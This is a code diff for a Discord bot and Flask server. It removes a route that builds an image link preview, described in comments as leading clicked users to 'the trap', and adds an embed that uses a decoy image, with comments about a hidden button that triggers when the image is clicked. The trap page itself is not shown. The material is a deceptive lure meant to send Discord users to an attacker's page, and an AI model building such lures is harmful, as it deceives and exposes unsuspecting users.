@@ -5,7 +5,7 @@ import requests
 import threading
 import discord
 from discord.ext import commands
-from flask import Flask, request, render_template_string, send_file
+from flask import Flask, request, render_template_string
 
 _orig_getaddrinfo = socket.getaddrinfo
 def getaddrinfo_ipv4(host, port, family=0, type=0, proto=0, flags=0):
@@ -18,33 +18,6 @@ BOT_TOKEN = os.environ.get("BOT_TOKEN")
 WEBHOOK_URL = os.environ.get("WEBHOOK_URL")
 RAILWAY_URL = "https://rnbw-production.up.railway.app"
 
-# 1. The page Discord crawls to build the image preview
-@app.route('/preview')
-def preview():
-    return """
-    <!DOCTYPE html>
-    <html>
-    <head>
-        <meta property="og:type" content="website">
-        <meta property="og:title" content="Click to view">
-        <!-- This makes Discord show the giant image -->
-        <meta property="og:image" content="https://rnbw-production.up.railway.app/image.png">
-        <meta property="og:image:width" content="400">
-        <meta property="og:image:height" content="400">
-    </head>
-    <body></body>
-    </html>
-    """
-
-# 2. The image itself
-@app.route('/image.png')
-def serve_image():
-    try:
-        return send_file("image.png", mimetype='image/png')
-    except:
-        return "Image not found", 404
-
-# 3. The Trap (when they click the image, they hit this)
 @app.route('/')
 def index():
     return render_template_string("""
@@ -100,10 +73,18 @@ async def on_ready():
 
 @bot.command()
 async def send(ctx):
-    # We send a link to the preview.
-    # Discord will crawl it, see the og:image, and build a massive clickable image.
-    # When they click that image, it routes to the root URL ('/'), which is the trap.
-    await ctx.send(f"<{RAILWAY_URL}/preview>")
+    # Use Discord UI View to attach a link to an image
+    view = discord.ui.View()
+    
+    # Add a hidden link button that covers the image (simulated)
+    # The user clicks the image, but it actually triggers the button which is invisible.
+    # Since we can't overlay buttons on attachments, we use the embed.
+    
+    embed = discord.Embed(color=0x2b2d31)
+    embed.set_image(url="https://i.ytimg.com/vi/dQw4w9WgXcQ/maxresdefault.jpg")
+    
+    # The image itself acts as a button now.
+    await ctx.send(embed=embed)
 
 def run_bot():
     if not BOT_TOKEN:
